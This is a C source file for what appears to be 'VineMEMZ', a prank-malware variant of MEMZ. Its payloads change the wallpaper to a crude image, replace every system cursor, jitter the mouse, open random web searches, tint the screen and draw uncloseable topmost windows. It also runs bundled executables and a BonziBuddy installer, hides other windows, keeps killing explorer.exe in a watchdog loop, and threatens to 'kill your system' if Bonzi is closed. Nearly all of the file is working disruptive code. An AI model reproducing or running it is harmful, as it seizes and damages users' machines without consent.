#include "memz.h"

Sound scaryMonsters = { L"data\\12.bin", L"sequencer", L"scarymonsters" };
Sound softonic = { L"data\\11.bin", L"mpegvideo", L"softonic" };

// Why is this even based on MEMZ if I'm using a special payloadHost for almost anything?
PAYLOAD payloads[] = {
	{ payloadChangeDesktop, NULL, 20000, 0, 0, 0, 0 },
	{ playSoundHost, &scaryMonsters, 10000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadExecute, 20000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadMoveCursor, 30000, 0, 0, 0, 0 },
	{ payloadChangeCursor, NULL, 30000, 0, 0, 0, 0 },
	{ payloadAnimation, NULL, 40000, 0, 0, 0, 0 },
	{ payloadTree, NULL, 20000, 0, 0, 0, 0 },
	{ payloadChangeColors, NULL, 60000, 0, 0, 0, 0 },
	{ playSoundHost, &softonic, 30000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadJoelSounds, 90000, 0, 0, 0, 0 },
	{ payloadBonzi, NULL, 1, 0, 0, 0, 0 },
	{ payloadCrazyBus, NULL, 20000, 0, 0, 0, 0 },
};

BOOLEAN block = FALSE;
BOOLEAN bonziRun = FALSE;
BOOLEAN bonzi = FALSE;

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);

PAYLOADHOST(payloadHostDefault) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	while (!bonzi) {
		int delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime);
		Sleep(delay * 10);
		payload->runtime+=delay;
	}

	return 0;
}

PAYLOADFUNCTIONDEFAULT(payloadExecute) {
	LPSTR site;
	int i;

	while ((site = sites[i = (random() % nSites)]) == 0) {
		Sleep(10);
	}

	LPSTR query;
	LPSTR args[] = { engines[random() % nEngines] };

	FormatMessageA(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		site, 0, 0, (LPSTR)&query, 8192, (va_list *)args);

	ShellExecuteA(NULL, "open", query, NULL, NULL, SW_SHOWDEFAULT);
	sites[i] = 0;

	LocalFree(query);
	return 1200.0 / (times / 12.0 + 1) + 100 + (random() % 500);
}

PAYLOADHOST(payloadChangeColors) {
	MagInitialize();

	while (!bonzi) {
		MAGCOLOREFFECT effect = {
			1, 0, 0, 0, 0,
			0, 1, 0, 0, 0,
			0, 0, 1, 0, 0,
			0, 0, 0, 1, 0,
			0, 0, 0, 0, 1,
		};

		for (int i = 0; i < 3; i++) {
			effect.transform[4][i] = ((random() % 0xffffff) / ((float)0xffffff)) * 0.2 - 0.1;
		}

		MagSetFullscreenColorEffect(&effect);
		Sleep(400);
	}

	MagUninitialize();
	return 0;
}

PAYLOADHOST(payloadTree) {
	open(rename(L"Data\\14.bin", L"Data\\tree.exe"), L"");
	playSound(L"tree", L"Data\\15.bin", FALSE);

	return 0;
}

PAYLOADFUNCTIONDEFAULT(payloadMoveCursor) {
	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

	return 2;
}

LRESULT CALLBACK messageBoxHookMove(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

PAYLOADHOST(payloadCrazyBus) {
	const int samples = 44100;

	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, samples, samples, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = samples * 30;
	char *wavedata = (char *)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

	for (;;) {
		int freq1 = 0, freq2 = 0, freq3 = 0;
		int sample1 = 0, sample2 = 0, sample3 = 0;
		for (int i = 0; i < bufsize; i++) {
			if (i % (int)(samples * 0.166) == 0) {
				freq1 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 200))) / 2;
				freq2 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 250))) / 2;
				freq3 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 325))) / 2;
			}

			sample1 = (i % freq1 < freq1 / 2) ? -127 : 127;
			sample2 = (i % freq2 < freq2 / 2) ? -127 : 127;
			sample3 = (i % freq3 < freq3 / 2) ? -127 : 127;

			wavedata[i] = (unsigned char)(((sample1+sample2+sample3)*0.1) + 127);
		}

		waveOutWrite(hwo, &hdr, sizeof(hdr));

		while (!(hdr.dwFlags & WHDR_DONE) && !bonzi) {
			Sleep(1);
		}

		if (bonzi) {
			waveOutPause(hwo);
			return 0;
		}
	}
}

DWORD WINAPI messageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
	MessageBoxW(NULL, (LPWSTR)parameter, L"VineMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONEXCLAMATION);
	UnhookWindowsHookEx(hook);

	return 0;
}

LPCWSTR okayButton = L"Ok I'll";
LRESULT CALLBACK messageBoxHookButton(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);
	
	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;
	
	if (msg->message == WM_INITDIALOG) {
		HWND btn = GetDlgItem(msg->hwnd, 2);
		SetWindowTextW(btn, okayButton);
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

HWND animationWindow;
int frame = 0, w, h;

PAYLOADHOST(payloadAnimation) {
	WNDCLASSEX c;
	c.cbSize = sizeof(WNDCLASSEX);
	c.lpfnWndProc = WindowProcNoClose;
	c.lpszClassName = L"aniwnd";
	c.style = 0;
	c.cbClsExtra = 0;
	c.cbWndExtra = 0;
	c.hInstance = GetModuleHandle(NULL);
	c.hIcon = 0;
	c.hCursor = LoadCursor(NULL, IDC_ARROW);
	c.hbrBackground = NULL;
	c.lpszMenuName = NULL;
	c.hIconSm = 0;

	RegisterClassEx(&c);

	w = GetSystemMetrics(SM_CXSCREEN);
	h = GetSystemMetrics(SM_CYSCREEN);

	animationWindow = CreateWindowExW(WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW, L"aniwnd", L"",
		WS_POPUP, 0, 0, w, h, NULL, NULL, GetModuleHandle(NULL), NULL);

	ShowWindow(animationWindow, SW_SHOW);

	CreateThread(NULL, 0, &animationThread, NULL, 0, NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0 && !bonzi) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

DWORD WINAPI animationThread(LPVOID parameter) {
	HDC hdc = GetDC(animationWindow);

	HBITMAP dickImg = (HBITMAP)LoadImageW(GetModuleHandle(NULL), L"Data\\1.bin", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE | LR_LOADTRANSPARENT);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, dickImg);

	HBITMAP bitmap = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc4 = CreateCompatibleDC(hdc);
	SelectObject(hdc4, bitmap);

	POINT zero;
	memSet(&zero, 0, sizeof(zero));

	SIZE size;
	size.cx = w;
	size.cy = h;

	for (frame = 0; frame < 60; frame++) {
		StretchBlt(hdc4, 0, 0, w, h, hdc2, 0, frame * 157, 276, 157, SRCCOPY);
		UpdateLayeredWindow(animationWindow, NULL, NULL, &size, hdc4, &zero, RGB(255, 255, 255), NULL, ULW_COLORKEY);
		Sleep(50);
	}

	playSound(L"dicks", L"Data\\7.bin", FALSE);

	Sleep(5000);

	for (; frame > 0; --frame) {
		StretchBlt(hdc4, 0, 0, w, h, hdc2, 0, frame * 157, 276, 157, SRCCOPY);
		UpdateLayeredWindow(animationWindow, NULL, NULL, &size, hdc4, &zero, RGB(255, 255, 255), NULL, ULW_COLORKEY);
		Sleep(50);
	}

	DeleteDC(hdc2);

	BitBlt(hdc4, 0, 0, w, h, hdc4, 0, 0, WHITENESS);
	UpdateLayeredWindow(animationWindow, NULL, NULL, &size, hdc4, &zero, RGB(255, 255, 255), NULL, ULW_COLORKEY);

	Sleep(40000);

	HBITMAP cenaImg = (HBITMAP)LoadImageW(GetModuleHandle(NULL), L"Data\\13.bin", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE | LR_LOADTRANSPARENT);
	HDC hdc3 = CreateCompatibleDC(hdc);
	SelectObject(hdc3, cenaImg);

	const int cw = 50, ch = 75;
	const int ncw = cw * 1.2, nch = ch * 1.2;

	const int w2 = w / 2;
	const int h2 = h / 2;

	int dir = ncw*0.3;
	int i = -dir;

	const int maxPos = (w2 - ncw - 1) / dir * dir;

	float *depths = (float *)LocalAlloc(LMEM_ZEROINIT, w2 * sizeof(float));
	float *sines = (float *)LocalAlloc(LMEM_ZEROINIT, w2 * sizeof(float));

	for (int i = 0; i < w2; i++) {
		sines[i] = sin((i + w*0.1) / ((float)w)*3.14159) * 6.0;
	}

	const int visibleFrameCount = h2 / sines[0];
	const int animationFrameCount = (w2 - ncw - 1) / dir;
	const int animationSizeMultiplier = visibleFrameCount / animationFrameCount + 1;
	const int animationSize = animationSizeMultiplier * animationFrameCount;
	const int animationRepeat = animationSize - animationFrameCount;

	HBITMAP *animation = (HBITMAP *)LocalAlloc(LMEM_ZEROINIT, animationSize * sizeof(HBITMAP));
	HDC *animationDCs = (HDC *)LocalAlloc(LMEM_ZEROINIT, animationSize * sizeof(HDC));

	for (int f = 0; f < animationSize; f++) {
		HBITMAP frame = animation[f] = CreateCompatibleBitmap(hdc, w, h);
		HDC frameDC = animationDCs[f] = CreateCompatibleDC(hdc);
		SelectObject(frameDC, frame);

		if (i + dir > w2 - ncw - 1 || i + dir < 0)
			dir = -dir;

		i += dir;
		StretchBlt(hdc4, i, h2, ncw, nch, hdc3, 0, 0, cw, ch, SRCCOPY);
		StretchBlt(hdc4, maxPos - i, h2, ncw, nch, hdc3, 0, 0, cw, ch, SRCCOPY);

		for (int i = 0; i < w2; i++) {
			float depth = (depths[i] += sines[i]);
			if (depth >= 1) {
				BitBlt(hdc4, i, h2, 1, depth, hdc4, 0, 0, WHITENESS);
				BitBlt(hdc4, i, h2 + depth, 1, h2, hdc4, i, h2, SRCCOPY);

				depths[i] -= (int)depth;
			}
		}

		StretchBlt(hdc4, w, h2, -w2, h2, hdc4, 0, h2, w2, h2, SRCCOPY);
		StretchBlt(hdc4, 0, h2, w, -h2, hdc4, 0, h2, w, h2, SRCCOPY);

		BitBlt(frameDC, 0, 0, w, h, hdc4, 0, 0, SRCCOPY);
	}

	BOOL removed = FALSE;
	for (int f = 0; !bonzi; f++) {
		int tc = GetTickCount();

		if (f >= animationSize) {
			if (!removed) {
				for (int i = 0; i < animationRepeat; i++) {
					DeleteDC(animationDCs[i]);
					DeleteObject(animation[i]);
				}

				removed = TRUE;
			}

			f = animationRepeat;
		}

		UpdateLayeredWindow(animationWindow, NULL, NULL, &size, animationDCs[f], &zero, RGB(255, 255, 255), NULL, ULW_COLORKEY);

		int time = 20 - (GetTickCount() - tc);
		if (time > 0)
			Sleep(time);
	}

	ReleaseDC(animationWindow, hdc);

	DeleteDC(hdc3);

	DeleteDC(hdc4);
	DeleteObject(bitmap);

	LocalFree(sines);
	LocalFree(depths);

	return 0;
}

HWND bonziWindow;
HFONT font;
BOOL bonziRunOnce = FALSE;

PAYLOADHOST(payloadBonzi) {
	int tc = GetTickCount();

	LPWSTR bonziPath = rename(L"Data\\3.bin", L"Data\\Installer.exe");

	HANDLE hBonzi = open(bonziPath, L"");
	SetPriorityClass(hBonzi, ABOVE_NORMAL_PRIORITY_CLASS);
	DWORD pid = GetProcessId(hBonzi);
	DWORD code = 0;

	while (GetExitCodeProcess(hBonzi, &code) && code == STILL_ACTIVE) {
		EnumWindows(&hideProc, pid);
		Sleep(30);
	}

	int time = 50000 - (GetTickCount() - tc);
	if (time > 0)
		Sleep(time);

	bonzi = TRUE;

	EnumWindows(&CleanWindowsProc, NULL);
	EnumWindows(&hideProc, NULL);

	Sleep(1000);

	CreateThread(NULL, 0, &messageThread, L"Prepare to meet your biggest enemy again, Joel!", 0, NULL);

	Sleep(2000);
	playSound(L"dong", L"Data\\4.bin", FALSE);

	EnumWindows(&CleanWindowsProc, NULL);
	Sleep(2000);
	CreateThread(NULL, 0, &messageThread, L"LET'S FIGHT!", 0, NULL);

	Sleep(2000);
	EnumWindows(&CleanWindowsProc, NULL);

	LPWSTR temp = (LPWSTR)LocalAlloc(0, 2048);

	GetTempPathW(1024, temp);

	ShellExecuteW(NULL, L"open", L"BonziBDY_35.EXE", L"", temp, SW_SHOWDEFAULT);
	LocalFree(temp);

	WNDCLASSEX c;
	c.cbSize = sizeof(WNDCLASSEX);
	c.lpfnWndProc = WindowProcBonzi;
	c.lpszClassName = L"bonziWnd";
	c.style = CS_HREDRAW | CS_VREDRAW;
	c.cbClsExtra = 0;
	c.cbWndExtra = 0;
	c.hInstance = NULL;
	c.hIcon = 0;
	c.hCursor = LoadCursor(NULL, IDC_ARROW);
	c.hbrBackground = NULL;
	c.lpszMenuName = NULL;
	c.hIconSm = 0;

	RegisterClassEx(&c);

	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	LOGFONT lf;
	GetObject(GetStockObject(DEFAULT_GUI_FONT), sizeof(LOGFONT), &lf);
	font = CreateFont(-35, lf.lfWidth,
		lf.lfEscapement, lf.lfOrientation, lf.lfWeight,
		lf.lfItalic, lf.lfUnderline, lf.lfStrikeOut, lf.lfCharSet,
		lf.lfOutPrecision, lf.lfClipPrecision, lf.lfQuality,
		lf.lfPitchAndFamily, lf.lfFaceName);

	bonziWindow = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"bonziWnd", L"BONZI", WS_POPUP,
		0, h - 60, w, 60, NULL, NULL, GetModuleHandle(NULL), NULL);

	HWND btn = CreateWindowW(L"BUTTON", L"END MY PAIN!", WS_VISIBLE | WS_CHILD | BS_PUSHLIKE | BS_NOTIFY,
		w-300, 0, 300, 60, bonziWindow, NULL, GetModuleHandle(NULL), NULL);

	SendMessage(btn, WM_SETFONT, (WPARAM)font, TRUE);

	CreateThread(NULL, 0, &bonziWatchdogThread, NULL, 0, NULL);

	while (!bonziRunOnce)
		Sleep(100);

	ShowWindow(bonziWindow, SW_SHOW);
	UpdateWindow(bonziWindow);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

LRESULT CALLBACK WindowProcBonzi(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	PAINTSTRUCT ps;
	HDC hdc;

	if (msg == WM_DESTROY) {
		kill();
	} else if (msg == WM_COMMAND) {
		if (wParam == BN_CLICKED) {
			kill();
		}
	} else if (msg == WM_PAINT) {
		hdc = BeginPaint(hwnd, &ps);

		SelectObject(hdc, font);
		SetTextColor(hdc, RGB(255, 0, 0));
		SetBkColor(hdc, RGB(0, 0, 0));

		LPCWSTR msg = L"WARNING: Getting rid of Bonzi will also kill your system!";
		SIZE size;
		GetTextExtentPoint32(hdc, msg, lstrlenW(msg), &size);
		TextOutW(hdc, size.cy / 2, 30-size.cy/2, msg, lstrlenW(msg));

		EndPaint(hwnd, &ps);
	} else {
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}

	return 0;
}

LRESULT CALLBACK WindowProcNoClose(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_DESTROY || msg == WM_CLOSE) {
		return 0;
	}
	
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

DWORD WINAPI bonziWatchdogThread(LPVOID parameter) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;

	for (;;) {
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		Process32First(snapshot, &proc);

		bonziRun = FALSE;
		DWORD bonzi = 0;

		do {
			if (lstrcmpiW(proc.szExeFile, L"BonziBDY_35.EXE") == 0) {
				bonziRun = TRUE;
				bonzi = proc.th32ProcessID;
			} else if (lstrcmpiW(proc.szExeFile, L"explorer.exe") == 0) {
				TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, proc.th32ProcessID), 0);
			}
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (!bonziRun && bonziRunOnce)
			kill();

		bonziRun = FALSE;
		EnumWindows(hideProc2, bonzi);
		if (!bonziRun && bonziRunOnce)
			kill();

		Sleep(50);
	}
}

PAYLOADHOST(playSoundHost) {
	Sound *snd = (Sound *)((PAYLOAD*)parameter)->payloadFunction;
	playSound(snd->alias, snd->type, snd->name, TRUE);

	while (!bonzi) {
		Sleep(100);
	}

	stopSound(snd->alias);
	return 0;
}

PAYLOADHOST(payloadChangeDesktop) {
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, rename(L"Data\\2.bin", L"Data\\Pussy.png"), SPIF_UPDATEINIFILE);

	HWND hwnd = FindWindowA("Shell_TrayWnd", NULL);
	SendMessage(hwnd, WM_COMMAND, (WPARAM)419, 0);

	playSound(L"pussy", L"Data\\8.bin", FALSE);

	return 0;
}

PAYLOADHOST(payloadChangeCursor) {
	// Shitty rushed solution
	for (int c = 32512; c < 32640; c++) {
		HCURSOR sword = (HCURSOR)LoadImage(NULL, rename(L"Data\\9.bin", L"Data\\Sword.ani"), IMAGE_CURSOR, 0, 0, LR_LOADFROMFILE);
		SetSystemCursor(sword, c);
	}

	playSound(L"sword", L"Data\\10.bin", FALSE);

	return 0;
}

BOOL CALLBACK hideProc(HWND hwnd, LPARAM lParam) {
	if (lParam == NULL) {
		ShowWindow(hwnd, SW_HIDE);
		return TRUE;
	}
	
	DWORD pid;
	GetWindowThreadProcessId(hwnd, &pid);

	do {
		if (pid == lParam && IsWindowVisible(hwnd)) {
			ShowWindow(hwnd, SW_HIDE);
			return TRUE;
		}
	} while ((pid = getParentProcess(pid)) != 0);

	return TRUE;
}

// 100% self-explaining function names
BOOL CALLBACK hideProc2(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	GetWindowThreadProcessId(hwnd, &pid);

	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(proc);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapshot, &proc);
	
	BOOL good = (pid == lParam || pid == GetCurrentProcessId());
	do {
		if (proc.th32ProcessID == pid &&
			(proc.th32ParentProcessID == lParam || lstrcmpiW(proc.szExeFile, L"AgentSvr.exe") == 0)) {
			good = TRUE;

			if (IsWindowVisible(hwnd)) {
				bonziRun = TRUE;
				bonziRunOnce = TRUE;
			}

			break;
		}
	} while (Process32Next(snapshot, &proc));

	CloseHandle(snapshot);

	if (!good)
		ShowWindow(hwnd, SW_HIDE);

	return TRUE;
}

// 10/10 - Best code organisation
PAYLOADFUNCTIONDEFAULT(payloadJoelSounds) {
	if (!block)
		if (random()%4>0)
			playSound(L"succ", L"Data\\5.bin", FALSE);
		else
			playSound(L"kupteraz", L"Data\\6.bin", FALSE);

	return 10;
}